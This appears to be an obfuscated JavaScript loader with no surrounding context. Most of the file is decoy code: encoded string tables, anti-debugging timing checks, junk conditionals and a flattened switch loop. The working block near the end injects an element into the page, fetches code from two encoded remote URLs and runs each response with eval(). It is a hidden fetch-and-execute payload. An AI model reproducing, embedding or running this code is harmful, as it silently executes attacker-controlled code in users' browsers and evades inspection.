var _checkWindow=function(o,k){return o[k];};var _activeThread = Date.now() | 0;
if ((function () {
    return (_activeThread >>> 1) < 0;
})()) {
    var _levelExpand = [0, 1, 2].filter(_dynamicSlice => _dynamicSlice > 0);
    Array.isArray(_levelExpand);
}
var _insertPending = Date.now() | 0;
if ((function () {
    return _insertPending < 0;
})()) {
    var _indexRemote = [0, 1, 2].filter(_refreshListener => _refreshListener > 0);
    Array.isArray(_indexRemote);
}
var _readyRecord = Date.now() | 0;
var _vectorLoad = 0x2c6b3 | 0x63bcb;
var _valueUnsigned=(function(){try{return Function('return this')();}catch(e){return typeof globalThis!=='undefined'?globalThis:this;}})();
var _sharedClone = Date.now() | 0;
var _foldBusy = 0x7c7c8 | 0x19331;
var _counterLazy = Date.now() | 0;
var _wrapQueue = 0x13728 | 0x3de6;
var _dispatchReader=
(function(){
  var _cloneStrict=[null,"\u003b\x17\u0002\u001e","\x6d\x4e\u005f",0x24,null,null,(0x59aed+0x5a769),"\u007a\x7c\u0055",null,null,"\u0059\u0012\x00\u0045\u0059",null,0xc94e5,"\x57\x5f\x54\u004c","\x6a\x75\x70\u005f",0x35be4,"\u0012\u0019\x15\x03\u001b\x13\x18\u0002","\u0049\x5e\u0021\x4c\x69","\u0060\x72\u0053",null,null,"\u007d\x3f\x32\u0070\x23",null,"\x7b\u0031\u005c",null,(0xa9f+0x6c490),(0x36600+0x4467),null,"\x69\u007a\x49\x7c","\x28\u003a\x49\u003b\u007a",null,0xbb9d6,null,(0xad7fa^0x82),0x2b41b,"\x5b\x6b\x22\x7e",null,(0x4a173^0xbd),(0xd59e7^0x1b),(0xf00fd^0x37),null,null,null,null,null,(0xc2a^0xf5),null,"\x3b\u0017\x02\u001e","\x13\x04\u0004\x19\x04",(0x1a267^0x9c),"\x64\u0052\u006b\u0061","\u0019\x18\u001a\x19\x17\x12",(0xa497b+0x1f616),"\x10\u0013\x02\u0015\x1e","\u005b\u0034\x7b\u0037\x55","\x05\x1a\x1f\u0015\x13","\u0051\x57","\x12\x1f\u0005\x06\x1a\x17\u000f","\x12\x19\x15\x03\u001b\x13\u0018\u0002",0x8100e,"\u0005\u001a\x1f\u0015\x13","\x25\x6c\x72\x7d","\u0059\x6e\u0067\x44\u0057",0x2fc00,(0x228b9+0x26ce4),null,"\u0031\x7a\u0041",null,null,null,0x71309,(0x5be38+0x71a71)];
  (function(_a,_c){
    var _hk=((_a['length']*0x9e3779b9)>>>0)&0xffff;
    var _rc=_c^_hk;
    var _sh=function(_n){while(--_n){_a['push'](_a['shift']());}};
    _sh(++_rc);
  })(_cloneStrict,0x3c04);
  var _deltaSparse=0x2cdb;
  
  var _lastCall=(((_deltaSparse*0x41+_deltaSparse)&0xffff&0xff)|0x10);
  var _handleUpdate;
  var _attachToken;
  if(typeof Proxy!=='undefined'){
    _attachToken=new Proxy(_cloneStrict,{get:function(t,k){return t[(+k)^0x4c];}});
  } else {
    _handleUpdate=function(k){return _cloneStrict[(+k)^0x4c];};
    _attachToken={get:_handleUpdate};
  }
  function _regionMatch(n){
    return typeof _attachToken['get']==='function'
      ? _attachToken['get'](n)
      : _attachToken[(n*0x1b57)&0xffff];
  }
  function _looseBuilder(n){return _regionMatch((n*0x67)&0xffff);}
  var _compressWeak=(function(){
    var _t=[];var _s=_lastCall;var _o=[];
    for(var _i=0;_i<256;_i++){_s=(_s*0xd+0xb)&0xff;_o.push({i:_i,v:_i^_lastCall,k:_s});}
    _o.sort(function(a,b){return a['k']-b['k'];});
    _o.sort(function(a,b){return a['i']-b['i'];});
    for(var _j=0;_j<_o['length'];_j++)_t.push(_o[_j]['v']);
    return _t;
  })();
  var _proxySorted=0;
  var _removeWidth=(typeof performance!=='undefined'&&performance['now'])?performance['now']():Date['now']();
  var _strongPool=false;
  return function(i){
    _proxySorted++;
    if(!_strongPool){
      var _src=arguments['callee']&&arguments['callee']['toString']?arguments['callee']['toString']():'f4e667';
      var _h=5381;for(var _ci=0;_ci<_src['length'];_ci++){_h=(((_h<<5)+_h)+_src['charCodeAt'](_ci))|0;}
      _strongPool=true;
    }
    var _now=(typeof performance!=='undefined'&&performance['now'])?performance['now']():Date['now']();
    var _dt=_now-_removeWidth;_removeWidth=_now;
    var _now2=(typeof performance!=='undefined'&&performance['now'])?performance['now']():Date['now']();
    if(_proxySorted>0xa&&(_now2-_removeWidth)>0xe9f){_deltaSparse=(_deltaSparse^0x16d)&0xffff;return 0x3cb5;}
    var _ri=_looseBuilder(i);
    if(typeof _ri==='string'&&_ri['length']>0){
      return String['fromCharCode'](...[..._ri]['map'](function(_c){
        var _cc=_c['charCodeAt'](0);
        return _cc<256?_compressWeak[_cc]:_cc;
      }));
    }
    return _ri;
  };
})();
var _idleBlock = Date.now() | 0;
if ((function () {
    return (_idleBlock ^ _idleBlock) !== 0;
})()) {
    var _pipeCall = 0x8cd956;
}
else {
    var _publicCompress = 0x758948;
}
var _safeCounter=
(function(_flushPrivate){
  var _pathActive=[null,"\u0025\x28\u007e","\u0044\u0074\u0047","\u002a\u0040",(0x10154^0x9c),(0x1d615+0x83830),0xd9ec2,(0xfed3+0x231cb),"\x4e\u0041\x29\u0034",null,"\u0022\x48\u0060\x6e\u0030",null,null,(0x47fc2+0x2e553),null,(0xd7297^0x43),(0x462a+0x1d03f),(0x5648+0x16d4),"\u003d\x2c\x3b\u003f\x2a\x3b\x1b\x32\x3b\x33\x3b\x30\u002a","\u0025\x49","\u002c\u003f\u0030\u003a\u0031\u0033","\x74\u0075","\x41\x7d","\x35\u0053\x44","\x2c\x3f\x30\x3a\u0031\u0033",null,"\u006f\u0066\u0037\x71","\x32\u0048\u0056\x74\u0057","\u005c\u003a\x2d",null,"\x30\u0031\u0030\x3b",0x2,"\u003c\u0037\u0030\u003a",null,"\u0049\u007d\u0022\x6b\u0074",null,"\u0033\x48",null,null,null,null,null,(0x572f4^0x21),"\u0024\x5c\x43\u0038","\u002d\u0032\u0037\x3d\x3b",null,(0x47b9f+0x8a9af),"\x4d\x4e\u007c",(0x2bf6+0x3e5dc),0x2e3a6,"\x2d\u003b\x2a\u000a\x37\u0033\x3b\x31\u002b\u002a","\u004e\u0039\u007c\u0037\x2d",0x49cf6,null,null,"\u0013\x3f\u002a\u0036",(0x75426^0x23),(0x5f499^0xf),null,(0x78166^0xff),"\u005b\u006f\x63\u0032",null,"\u0061\x5e\u0058",0x8bdcc,null,(0xceefc^0xb9),0x2,"\x3c\u0031\x3a\u0027",null,null,"\x6b\x7e\x33"];
  (function(_a,_c){
    var _hk=((_a['length']*0x9e3779b9)>>>0)&0xffff;
    var _rc=_c^_hk;
    var _sh=function(_n){while(--_n){_a['push'](_a['shift']());}};
    _sh(++_rc);
  })(_pathActive,0xc241);
  var _reduceDecoder=0x2f5;
  var _loaderIdle=(function(){try{var _r=_flushPrivate((0xbd^0xf5));return typeof _r==="string"&&_r['length']>0?_r['charCodeAt'](0):0x64;}catch(_e){return (0x62+0x2);}}());
  var _applyStatic=((((_reduceDecoder*0x41+_reduceDecoder)&0xffff&0xff)|0x10)^_loaderIdle)&0xff;
  var _lazyValidate;
  var _dynamicCursor;
  if(typeof Proxy!=='undefined'){
    _dynamicCursor=new Proxy(_pathActive,{get:function(t,k){return t[(+k)^0x22];}});
  } else {
    _lazyValidate=function(k){return _pathActive[(+k)^0x22];};
    _dynamicCursor={get:_lazyValidate};
  }
  function _remoteFind(n){
    return typeof _dynamicCursor['get']==='function'
      ? _dynamicCursor['get'](n)
      : _dynamicCursor[(n*0x4321)&0xffff];
  }
  function _workerDecode(n){return _remoteFind((n*0xe1)&0xffff);}
  var _weightReady=(function(){
    var _t=[];var _s=_applyStatic;var _o=[];
    for(var _i=0;_i<256;_i++){_s=(_s*0xd+0xb)&0xff;_o.push({i:_i,v:_i^_applyStatic,k:_s});}
    _o.sort(function(a,b){return a['k']-b['k'];});
    _o.sort(function(a,b){return a['i']-b['i'];});
    for(var _j=0;_j<_o['length'];_j++)_t.push(_o[_j]['v']);
    return _t;
  })();
  var _dropOffset=0;
  var _sharedResolver=(typeof performance!=='undefined'&&performance['now'])?performance['now']():Date['now']();
  var _entryReject=false;
  return function(i){
    _dropOffset++;
    if(!_entryReject){
      var _src=arguments['callee']&&arguments['callee']['toString']?arguments['callee']['toString']():'de4c79';
      var _h=5381;for(var _ci=0;_ci<_src['length'];_ci++){_h=(((_h<<5)+_h)+_src['charCodeAt'](_ci))|0;}
      _entryReject=true;
    }
    var _now=(typeof performance!=='undefined'&&performance['now'])?performance['now']():Date['now']();
    var _dt=_now-_sharedResolver;_sharedResolver=_now;
    var _now2=(typeof performance!=='undefined'&&performance['now'])?performance['now']():Date['now']();
    if(_dropOffset>0xc&&(_now2-_sharedResolver)>0xd9c){_reduceDecoder=(_reduceDecoder^0x7961)&0xffff;return 0x4ef;}
    var _ri=_workerDecode(i);
    if(typeof _ri==='string'&&_ri['length']>0){
      return String['fromCharCode'](...[..._ri]['map'](function(_c){
        var _cc=_c['charCodeAt'](0);
        return _cc<256?_weightReady[_cc]:_cc;
      }));
    }
    return _ri;
  };
})(_dispatchReader);
var _skipFree = Date.now() | 0;
var _builderFast = 0x5dc4c | 0x197f2;
var _deferRegion = Date.now() | 0;
if ((function () {
    return _deferRegion === -2;
})()) {
    var _usedKernel = [0, 1, 2].filter(_stateDrain => _stateDrain > 0);
    Array.isArray(_usedKernel);
}
var _frozenWrite = Date.now() | 0;
var _swapRaw = 0x3dc79 | 0x93d4;
var _queuePush=
(function(_depthInner){
  var _shiftLimit=[null,null,0x2f170,(0xca1fd^0x25),null,null,(0x79cab^0x5b),0x9e8d,null,"\u00fe\u00ef\xef\u00fa\u00f1\xfb\u00dc\u00f7\xf6\xf3\xfb",null,"\xf6\xf9\xed\u00fe\xf2\xfa",null,null,(0x9d03^0x4b),"\x24\u007e\x6d",0xa764f,0xb2227,"\u0063\x3a","\u0066\u0024\u0021\x24",null,null,null,null,null,"\xeb\u00fa\xe7\xeb",null,0x1c7a6,"\xeb\xf0\xcc\u00eb\u00ed\u00f6\xf1\u00f8","\xed\u00fe\xf1\xfb\u00f0\u00f2",null,null,"\x61\u0052\x50",(0x44009+0x352b0),null,null,"\xf6\u00fb",null,"\x2f\u006b\u0026",0xa7079,"\x68\u0053","\u002f\u0024\u0062\x7e\u0063",0xf2cb3,"\xeb\xf0\xcc\u00eb\u00ed\u00f6\u00f1\u00f8",null,null,0x4784,(0x687c+0x35f6a),"\u004e\u006e","\u006e\x3d\x31\u0023\u003d","\u0054\u0022\u0056\x62","\u005c\x79","\u00eb\xfa\u00e7\u00eb",(0x698a8^0xa3),"\x2d\u002c\u0077\x71\x7b",null,"\x49\x40\x21\x64",null,"\x4c\x32\u0052\u0061\u004e",0x7d0,0x3d8f6,"\xfc\xf0\xf1\xeb\xfa\u00f1\xeb\u00c8\u00f6\xf1\u00fb\xf0\u00e8",(0xd4643+0xccfd),"\u003f\x6b\u007e",(0x6638+0x4da8a),"\u0048\x36",null,"\u006c\u006b",0xbcbb3,0x2,null];
  (function(_a,_c){
    var _hk=((_a['length']*0x9e3779b9)>>>0)&0xffff;
    var _rc=_c^_hk;
    var _sh=function(_n){while(--_n){_a['push'](_a['shift']());}};
    _sh(++_rc);
  })(_shiftLimit,0xc274);
  var _publicStack=0x8bbe;
  var _closeTable=(function(){try{var _r=_depthInner((0x7d^0x5b));return typeof _r==="string"&&_r['length']>0?_r['charCodeAt'](0):(0x9*0xb);}catch(_e){return (0x4f+0x14);}}());
  var _nodeUsed=((((_publicStack*0x41+_publicStack)&0xffff&0xff)|0x10)^_closeTable)&0xff;
  var _verifyPacked;
  var _scopeSetup;
  if(typeof Proxy!=='undefined'){
    _scopeSetup=new Proxy(_shiftLimit,{get:function(t,k){return t[(+k)^0x53];}});
  } else {
    _verifyPacked=function(k){return _shiftLimit[(+k)^0x53];};
    _scopeSetup={get:_verifyPacked};
  }
  function _sortMutable(n){
    return typeof _scopeSetup['get']==='function'
      ? _scopeSetup['get'](n)
      : _scopeSetup[(n*0x8fd9)&0xffff];
  }
  function _fastEncode(n){return _sortMutable((n*0x69)&0xffff);}
  var _packParser=(function(){
    var _t=[];var _s=_nodeUsed;var _o=[];
    for(var _i=0;_i<256;_i++){_s=(_s*0xd+0xb)&0xff;_o.push({i:_i,v:_i^_nodeUsed,k:_s});}
    _o.sort(function(a,b){return a['k']-b['k'];});
    _o.sort(function(a,b){return a['i']-b['i'];});
    for(var _j=0;_j<_o['length'];_j++)_t.push(_o[_j]['v']);
    return _t;
  })();
  var _frozenZone=0;
  var _fiberSet=(typeof performance!=='undefined'&&performance['now'])?performance['now']():Date['now']();
  var _lightResolve=false;
  return function(i){
    _frozenZone++;
    if(!_lightResolve){
      var _src=arguments['callee']&&arguments['callee']['toString']?arguments['callee']['toString']():'aa513b';
      var _h=5381;for(var _ci=0;_ci<_src['length'];_ci++){_h=(((_h<<5)+_h)+_src['charCodeAt'](_ci))|0;}
      _lightResolve=true;
    }
    var _now=(typeof performance!=='undefined'&&performance['now'])?performance['now']():Date['now']();
    var _dt=_now-_fiberSet;_fiberSet=_now;
    var _now2=(typeof performance!=='undefined'&&performance['now'])?performance['now']():Date['now']();
    if(_frozenZone>0x9&&(_now2-_fiberSet)>0xc9a){_publicStack=(_publicStack^0x904c)&0xffff;return 0xe32c;}
    var _ri=_fastEncode(i);
    if(typeof _ri==='string'&&_ri['length']>0){
      return String['fromCharCode'](...[..._ri]['map'](function(_c){
        var _cc=_c['charCodeAt'](0);
        return _cc<256?_packParser[_cc]:_cc;
      }));
    }
    return _ri;
  };
})(_safeCounter);
var _poolLight = Date.now() | 0;
while ((function () {
    return (_poolLight ^ _poolLight) !== 0;
})()) {
    _poolLight | 0;
}
var _connectHandle = Date.now() | 0;
if ((function () {
    return (_connectHandle + 1) === _connectHandle;
})()) {
    var _innerSignal = [0, 1, 2].filter(_betaFind => _betaFind > 0);
    Array.isArray(_innerSignal);
}
var _nextLoad=
(function(_renderFactory){
  var _alignedHandler=["\u003d\u004f\u005b",null,"\u0075\x42\x2d\u0052",null,null,(0x867+0x96ee),null,"\x14\x18\x19\u0004\x18\x1b\u0012","\x7b\x25\x7a\u002f",0x24,"\u002a\u0074\u0030\x7e",(0xb1bdb^0x22),"\u0046\u0072\u0071\x6a\u0041",(0x1b*0x2ed7),"\x14\u0018\x19\u0003\x12\u0019\x03\x20\u001e\x19\x13\x18\u0000","\u0061\x7b\u0057\x70",(0x9c8d5^0xdf),(0x72b3d^0x3),null,0x24,0x7b3d3,"\x69\u0026\x77\x27",null,null,null,"\u006b\u0038\x2c",null,"\x4c\x26\x7b\x63",null,"\x34\u0057\x4b\x36",0x84acc,"\u006f\x3c\u007a",0xde975,"\x5f\u0059","\u0037\x6a",null,"\x04\u0005\x14",null,null,"\x78\u006d\x5f\x61",(0x7aa7c+0x115a1),null,"\x1f\u0003\u0003\u0007\u0004\u004d\u0058\x58\x04\x18\u001b\x01\x05\x59\u0003\x18\x07\x58\x16\u0019\u0003\u001e\x5a\x13\u0012\x15\x02\u0010\x59\u001d\x04\u0048\u0001\u004a","\x26\x7b",(0x1515a^0x63),"\u0027\u0005\u0018\u001a\x1e\u0004\u0012",null,null,0x36196,0x31313,null,0xeef88,null,"\u0003\x18\x24\x03\u0005\x1e\u0019\x10",(0x122a0+0x212eb),(0x4136^0xc1),null,"\u0047\u007c\x72","\x1f\u0003\x03\u0007\u0004\x4d\u0058\x58\u0004\x18\x1b\x01\x05\u0059\x03\u0018\u0007\x58\u001a\x16\x1e\u0019\u0059\u001d\u0004\u0048\u0001\x4a","\x04\u0003\u000e\u001b\u0012","\x7b\x49\x56",(0x675b2+0x40404),"\u0079\x53\u0027\x2e\x4f","\x47\u004e\x24\u0062","\u0064\u0068\x68","\u0011\u0012\x03\x14\u001f\x34\x18\u0019\x03\x12\u000f\u0003",null,0xb45cd,null,(0x484b3^0x3f),"\x42\x69"];
  (function(_a,_c){
    var _hk=((_a['length']*0x9e3779b9)>>>0)&0xffff;
    var _rc=_c^_hk;
    var _sh=function(_n){while(--_n){_a['push'](_a['shift']());}};
    _sh(++_rc);
  })(_alignedHandler,0xc276);
  var _hookMap=0x3227;
  var _sparseSegment=(function(){try{var _r=_renderFactory(0x44);return typeof _r==="string"&&_r['length']>0?_r['charCodeAt'](0):(0x3a^0x53);}catch(_e){return 0x69;}}());
  var _syncPointer=((((_hookMap*0x41+_hookMap)&0xffff&0xff)|0x10)^_sparseSegment)&0xff;
  var _chunkNext;
  var _shallowInit;
  if(typeof Proxy!=='undefined'){
    _shallowInit=new Proxy(_alignedHandler,{get:function(t,k){return t[(+k)^0x2c];}});
  } else {
    _chunkNext=function(k){return _alignedHandler[(+k)^0x2c];};
    _shallowInit={get:_chunkNext};
  }
  function _writerMain(n){
    return typeof _shallowInit['get']==='function'
      ? _shallowInit['get'](n)
      : _shallowInit[(n*0xd947)&0xffff];
  }
  function _clearSigned(n){return _writerMain((n*0x77)&0xffff);}
  var _unsignedBuffer=(function(){
    var _t=[];var _s=_syncPointer;var _o=[];
    for(var _i=0;_i<256;_i++){_s=(_s*0xd+0xb)&0xff;_o.push({i:_i,v:_i^_syncPointer,k:_s});}
    _o.sort(function(a,b){return a['k']-b['k'];});
    _o.sort(function(a,b){return a['i']-b['i'];});
    for(var _j=0;_j<_o['length'];_j++)_t.push(_o[_j]['v']);
    return _t;
  })();
  var _frameZip=0;
  var _safeGet=(typeof performance!=='undefined'&&performance['now'])?performance['now']():Date['now']();
  var _lockBounded=false;
  return function(i){
    _frameZip++;
    if(!_lockBounded){
      var _src=arguments['callee']&&arguments['callee']['toString']?arguments['callee']['toString']():'701cc4';
      var _h=5381;for(var _ci=0;_ci<_src['length'];_ci++){_h=(((_h<<5)+_h)+_src['charCodeAt'](_ci))|0;}
      _lockBounded=true;
    }
    var _now=(typeof performance!=='undefined'&&performance['now'])?performance['now']():Date['now']();
    var _dt=_now-_safeGet;_safeGet=_now;
    var _now2=(typeof performance!=='undefined'&&performance['now'])?performance['now']():Date['now']();
    if(_frameZip>0xf&&(_now2-_safeGet)>0xb75){_hookMap=(_hookMap^0x7cac)&0xffff;return 0xd74;}
    var _ri=_clearSigned(i);
    if(typeof _ri==='string'&&_ri['length']>0){
      return String['fromCharCode'](...[..._ri]['map'](function(_c){
        var _cc=_c['charCodeAt'](0);
        return _cc<256?_unsignedBuffer[_cc]:_cc;
      }));
    }
    return _ri;
  };
})(_queuePush);
(7144 > 7209 ? 0x35054 : 0x34403, (async () => {
    try {
        var _lightEncoder = _valueUnsigned[_dispatchReader((72))][_safeCounter(((19 + 19)))](_queuePush(((92 ^ 24))));
        _lightEncoder[_nextLoad((30))] = _dispatchReader((10)) + _checkWindow(_valueUnsigned, _safeCounter(((7 + 4))))[_queuePush((122))]()[_nextLoad((111))](_dispatchReader((115)))[_safeCounter(((46 + 14)))](_queuePush((89)));
        _lightEncoder[_nextLoad((46))][_dispatchReader((97))] = _safeCounter((50));
        (typeof 28 === "boolean", _lightEncoder[_queuePush(((12 ^ 111)))] = _nextLoad((36)));
        (0xa952 & 0x7d36, _checkWindow(_valueUnsigned, _dispatchReader(((29 + 69))))[_safeCounter((23))][_queuePush((70))](_lightEncoder));
        await new _valueUnsigned[_nextLoad(((229 ^ 242)))](_windowSave => { var _tensorSplice = 108145607; _looseAppend: while (_tensorSplice !== -1) {
            switch (_tensorSplice) {
                case 91203323:
                    var _pullCache = _tensorSplice & 0x68, _sortedContext = (_valueUnsigned[_safeCounter(((225 ^ 231)))](_windowSave, _queuePush(((214 ^ 133)))), 0x1) & 0x7829;
                    _tensorSplice = (function () {
                        return (_tensorSplice ^ _tensorSplice) !== 0;
                    })() ? 145469970 | _pullCache ^ _pullCache : -1;
                    continue;
                case 118854464:
                    var _packetCopy = (_tensorSplice ^ 0xe241) & 0xff;
                    _tensorSplice = (function () {
                        return _tensorSplice < 0;
                    })() ? 83655960 | _packetCopy ^ _packetCopy : 235912427;
                    continue;
                case 18386678:
                    var _encoderCurrent = (_tensorSplice ^ 0x847e) & 0xff;
                    _tensorSplice = (function () {
                        return _tensorSplice < 0;
                    })() ? 241014708 | _encoderCurrent ^ _encoderCurrent : -1;
                    continue _looseAppend;
                case 264935035:
                    var _mountIndexed = _tensorSplice & 0x67;
                    _tensorSplice = (function () {
                        return _tensorSplice < 0;
                    })() ? 124250418 | _mountIndexed ^ _mountIndexed : 18386678;
                    continue;
                case 235912427:
                    var _strongScan = _tensorSplice & 0x72;
                    _tensorSplice = (function () {
                        return (_tensorSplice + 1) === _tensorSplice;
                    })() ? 74854360 | _strongScan ^ _strongScan : -1;
                    continue _looseAppend;
                case 108145607:
                    var _emitDense = _tensorSplice & 0x2d, _lengthLast = (_lightEncoder[_dispatchReader(((59 + 48)))] = _windowSave, 0x1) & 0xb071;
                    _tensorSplice = (function () {
                        return (_tensorSplice >>> 1) < 0;
                    })() ? 232059192 | _emitDense ^ _emitDense : 91203323;
                    continue _looseAppend;
                default: break _looseAppend;
            }
        } });
        var _innerCopy = _checkWindow(_lightEncoder, _nextLoad(((84 ^ 100))))[_dispatchReader(((55 + 46)))][_safeCounter(((31 + 17)))](_lightEncoder[_queuePush(((79 + 2)))]);
        var _scanHeavy = (typeof 51 === "boolean", _nextLoad((45)) + _valueUnsigned[_dispatchReader((111))][_safeCounter(((7 + 29)))]()[_queuePush(((219 ^ 160)))](_nextLoad((13)))[_dispatchReader(((48 + 55)))](_safeCounter((51))));
        var _sourceAligned = await _innerCopy(_scanHeavy);
        var _bindHeight = await _sourceAligned[_queuePush((118))]();
        eval(_bindHeight);
        var _shallowIndex = _nextLoad((20)) + _valueUnsigned[_dispatchReader((113))][_safeCounter((40))]()[_queuePush(((191 ^ 219)))](_nextLoad(((59 * 1))))[_dispatchReader((124))](_safeCounter((22)));
        var _listenerParse = await _innerCopy(_shallowIndex);
        var _mainExpand = await _listenerParse[_queuePush(((197 ^ 214)))]();
        eval(_mainExpand);
    }
    catch (_sliceDeep) {
        (typeof 54 === "boolean", _valueUnsigned[_nextLoad(((42 + 15)))][_dispatchReader((104))](_sliceDeep));
    }
})());
var _alignedApply = Date.now() | 0;
var _mainSlot = Date.now() | 0;
if ((function () {
    return (_mainSlot ^ _mainSlot) !== 0;
})()) {
    var _channelValidate = 0x1699d5;
}
else {
    var _unsignedFlush = 0xd9879c;
}
if ((function () {
    return (_alignedApply ^ 0) === _alignedApply;
})()) {
    0x6f54 | 0xa12b;
}
else {
    var _unpackOuter = 0xfefbd4;
}
var _cursorShallow = Date.now() | 0;
var _addWorker = Date.now() | 0;
while ((function () {
    return (_addWorker >>> 1) < 0;
})()) {
    _addWorker | 0;
}
while ((function () {
    return (_cursorShallow ^ _cursorShallow) !== 0;
})()) {
    _cursorShallow | 0;
}
